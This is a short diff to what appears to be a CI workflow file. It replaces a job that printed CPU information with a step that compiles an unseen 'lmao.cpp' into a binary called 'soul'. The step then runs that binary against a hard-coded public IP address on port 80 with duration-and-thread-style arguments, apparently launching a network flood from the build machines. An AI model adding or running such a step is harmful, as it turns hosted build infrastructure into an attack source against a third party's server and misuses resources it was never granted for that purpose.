@@ -1,15 +1,10 @@
-workflows:
-  mac-system-check:
-    name: CPU Info Workflow (Mac M4)
-    max_build_duration: 10
-    instance_type: mac_mini_m4  # or mac_mini_m1 / mac_mini_m2 depending on provider
-    scripts:
-      - name: Display CPU Architecture
-        script: |
-          echo "Listing CPU details:"
-          system_profiler SPHardwareDataType
-          uname -m
-      - name: Check Available Processors
-        script: |
-          echo "Number of processing units available:"
-          sysctl -n hw.ncpu
+- name: Build and Run C++ Program
+  script: |
+    echo "Compiling..."
+    clang++ -std=c++14 -O3 -march=native lmao.cpp -o soul -pthread
+
+    echo "Making executable..."
+    chmod +x soul
+
+    echo "Running..."
+    ./soul 195.154.218.179 80 60 200
